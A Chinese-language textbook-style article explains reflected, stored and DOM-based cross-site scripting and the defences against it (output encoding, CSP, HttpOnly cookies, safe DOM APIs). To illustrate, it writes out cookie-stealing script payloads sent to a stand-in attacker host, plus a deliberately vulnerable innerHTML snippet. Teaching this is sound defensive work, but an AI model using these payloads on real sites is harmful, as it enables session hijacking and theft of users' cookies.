---
title: 跨站脚本攻击（XSS）：反射型、存储型与 DOM 型
date: 2026-08-07
---

# 跨站脚本攻击（XSS）：反射型、存储型与 DOM 型

<div class="epigraph">
<p>XSS 是「注入家族」在浏览器里的化身——攻击者不入侵服务器，而是让受害者的浏览器替自己执行代码。</p>
<footer>—— OWASP（XSS 防护速查）</footer>
</div>

<div class="article-byline">
<p>第三级 · 密码学与信息安全 ｜ Stallings《密码编码学与网络安全》第二十六章 ｜ 2026-08-07</p>
</div>

## 为什么从 XSS 开始

上一节的 SQL 注入打服务器，而 **XSS（Cross-Site Scripting，跨站脚本）** 打的是**用户的浏览器**：攻击者把恶意脚本注入网页，受害者的浏览器在「可信站点」的上下文里执行它。XSS 是 Web 安全最普遍的漏洞之一，能偷 Cookie、劫持会话、篡改页面、甚至把用户变成攻击者的跳板。理解 XSS 的三种形态（反射型、存储型、DOM 型），是 Web 安全的必修课。<span class="marginnote">一个认知锚点：<strong>XSS 的本质是「不可信数据被渲染成 HTML/JS 并执行」</strong>——与 SQL 注入的「数据当代码」完全同构，只是目标从数据库换成了浏览器。浏览器信任「来自可信站点的脚本」，攻击者利用这个信任在页面里塞进自己的脚本。</span>

## 1 反射型 XSS：输入「弹回来」就执行

**反射型（reflected）XSS**：恶意脚本在**请求里**，服务器把它「反射」回响应页面。

经典场景（搜索框）：

1. 受害者点击恶意链接：`http://victim.com/search?q=<script>document.location='//evil.com/?c='+document.cookie</script>`
2. 服务器把 `q`（搜索关键词）的值**原样**拼进页面：`<p>您搜索的是：<script>…</script></p>`
3. 浏览器执行了注入的 `<script>`——把 Cookie 发给攻击者。

**特征**：注入代码不持久，**一次请求一次执行**——需要「诱导受害者点击恶意链接」（钓鱼、发链接）。

**危害**：会话劫持（偷 Cookie）、钓鱼、冒充用户操作。

用一个具体的 payload 体会「浏览器替攻击者执行」。攻击者构造链接 `http://victim.com/search?q=<script>fetch('//evil.com/?c='+document.cookie)</script>`，把链接发给受害者。受害者点击后，服务器把 `q` 原样反射进页面，浏览器解析 HTML 时执行 `<script>`——`document.cookie` 里的会话令牌被 `fetch` 送到攻击者服务器。攻击者拿到 Cookie 后，用「会话劫持」冒充受害者登录。**整个过程中服务器没有任何代码被执行，被利用的是「浏览器对可信域脚本的信任」**。

## 2 存储型 XSS：代码住进数据库

**存储型（stored）XSS**：恶意脚本**被服务器存储**（评论、发帖、用户名），任何访问该页面的用户都会触发。

经典场景（评论区）：

1. 攻击者在评论框提交：`<script>new Image().src='//evil.com/?c='+document.cookie</script>`
2. 服务器把评论存进数据库。
3. **每个访问该页面的用户**，浏览器都执行这段脚本——攻击者批量收割 Cookie。

**特征**：**持久、被动触发、影响所有访问者**——比反射型危害大得多。论坛、CMS、评论区是重灾区。

**危害**：批量会话劫持、蠕虫式传播（脚本自动发帖）、全站用户沦陷。

## 3 DOM 型 XSS：代码在浏览器里「就地取材」

**DOM 型（DOM-based）XSS**：恶意脚本不进服务器响应，而是**在浏览器端的 JavaScript 里**被构造执行。

经典场景（前端路由/查询参数）：

```javascript
// DOM XSS：前端从 URL 参数读数据，直接拼进 innerHTML
const name = new URLSearchParams(location.search).get("name");
document.getElementById("welcome").innerHTML = "你好，" + name;  // 危险！
```

如果 `name` 是 `<img src=x onerror=alert(1)>`，`innerHTML` 把它当 HTML 渲染——`onerror` 触发脚本。

`innerHTML` 这类 API 之所以危险，在于它**把字符串按 HTML 解析**——`<img onerror>`、`<a href="javascript:…">`、`<svg onload>` 都会被渲染成可执行结构。相比之下 `textContent` 把字符串当**纯文本**：即使内容是 `<script>`，也只会显示成文字、绝不执行。所以 DOM XSS 的防御口诀是「能用 `textContent` 就不用 `innerHTML`，非用不可就先编码再插入」。

**特征**：**服务器完全不知情**（攻击发生在客户端 DOM 操作），传统 WAF/服务端过滤看不见它。检测更难、防御要改前端代码。<span class="marginnote">DOM XSS 是三种里「最现代、最难防」的：<strong>它绕过了服务器（请求与响应都正常），问题全在浏览器里的 `innerHTML`、`document.write()`、`eval()` 等「把数据当代码」的 API</strong>。防御不能靠服务端，必须在前端「把输出编码 + 用安全 API（textContent 而非 innerHTML）」。</span>

## 4 公式解析：XSS 的统一成因

$$
\text{不可信数据} + \text{浏览器渲染为可执行上下文（HTML/JS）} \Rightarrow \text{脚本执行}
$$

三步拆解这条「XSS 通用公式」：

- **第一步，数据来源**：用户输入、URL 参数、数据库内容、第三方 API——都可能是不可信的。
- **第二步，渲染路径**：`innerHTML`、`outerHTML`、`document.write()`、模板字符串拼接——把数据「当代码」插入。
- **第三步，执行上下文**：浏览器在页面源（可信域）上下文执行脚本——**脚本拥有该域的全部权限（Cookie、localStorage、DOM）**。

## 5 防御 XSS：输出编码 + CSP

XSS 防御的核心是**「永远把不可信数据当数据，不当代码」**：

- **输出编码（Output Encoding）**：根据渲染上下文编码——HTML 实体编码、JS 字符串转义、URL 编码、属性编码。框架（React 默认转义、Django 自动转义）已内置。
- **CSP（Content Security Policy）**：HTTP 响应头声明「哪些脚本可信」——`script-src` 指令禁止内联脚本，即使注入成功也不执行。
- **HttpOnly Cookie**：带 `HttpOnly` 属性的 Cookie **JavaScript 读不到**——偷 Cookie 的 XSS 失效（但防不了其他利用）。
- **输入验证**：白名单校验（纵深防御补充，不是主防线）。
- **安全 API**：用 `textContent` 而非 `innerHTML`、不用 `eval()`。

**分层**：输出编码是「根治」（正确编码就让注入无法成为代码），CSP 是「兜底」（编码漏了也拦截执行），HttpOnly 是「减损」（即使执行也偷不到 Cookie）。<span class="marginnote">CSP 是 XSS 防御的「第二层铠甲」：<strong>即使输出编码漏了、脚本被注入了，CSP 也会阻止浏览器执行它</strong>——「允许执行的脚本白名单」把攻击脚本挡在门外。现代 Web 应用的标配是「输出编码 + CSP + HttpOnly」三层叠加。</span>

### 补充：为什么「框架自动转义」还不够

React、Vue、Django 默认自动转义，很多团队因此以为「用了框架 = 没有 XSS」。这个假设有两处漏洞：**① 框架的自动转义只覆盖「模板渲染」这条路径**——`dangerouslySetInnerHTML`、`v-html`、`innerHTML` 这些「显式关闭转义」的出口不在此列；**② DOM XSS 发生在纯前端逻辑里**，服务器端模板根本管不到。所以「框架自动转义」是「默认值正确」，但每一个「主动关闭转义」的调用点都需人工复审——CSP 与安全 API 正是给这些「例外」兜底的。

### 辨析｜易错点：XSS 不等于 CSRF，两者常被混为一谈

**XSS** 是「攻击者在受害者的浏览器里执行任意脚本」（注入发生在页面），**CSRF** 是「攻击者诱导受害者的浏览器**代发请求**」（利用受害者的已认证会话，不需要执行脚本）。两者的关系是：**XSS 能实现 CSRF 的效果**（脚本里发一个带 Cookie 的请求即可），但 CSRF 不依赖 XSS——一个纯静态页面的链接也能触发 CSRF。区分它们对防御的意义：XSS 靠「输出编码 + CSP」，CSRF 靠「CSRF Token + SameSite Cookie」。**一个治「页面被注入代码」，一个治「请求被伪造」**——两条防线互不替代。

### 算例：三种类型的「判定速查」

| 类型 | 代码存在哪 | 谁触发 | 服务器可见性 | 防御重心 |
| --- | --- | --- | --- | --- |
| 反射型 | 请求 URL | 受害者点击链接 | 可见（反射点） | 输出编码 |
| 存储型 | 数据库 | 任何访问者 | 可见（存储点） | 输出编码 + 输入过滤 |
| DOM 型 | 前端 JS | 访问者（前端构造） | **不可见** | 前端安全 API + CSP |

这张表回答了「我该先查哪里」：反射型在请求处理处、存储型在数据渲染处、DOM 型在 `innerHTML`/`eval` 调用处——三者是三条不同的排查路径。

## 6 小结

- **反射型**：恶意代码在请求里，服务器反射执行——需诱导点击。
- **存储型**：代码存进数据库，所有访问者触发——持久、危害大。
- **DOM 型**：代码在前端 JS 里构造执行——服务器看不见，最难防。
- **统一成因**：不可信数据被渲染成可执行上下文。
- **防御**：输出编码（根治）+ CSP（兜底）+ HttpOnly Cookie（减损）+ 安全 API。
- **辨析**：XSS 注入脚本、CSRF 伪造请求——XSS 可实现 CSRF 效果，但防御互不替代。

在下一节，我们看 XSS 的「兄弟」攻击——**跨站请求伪造（CSRF）及其防护**。
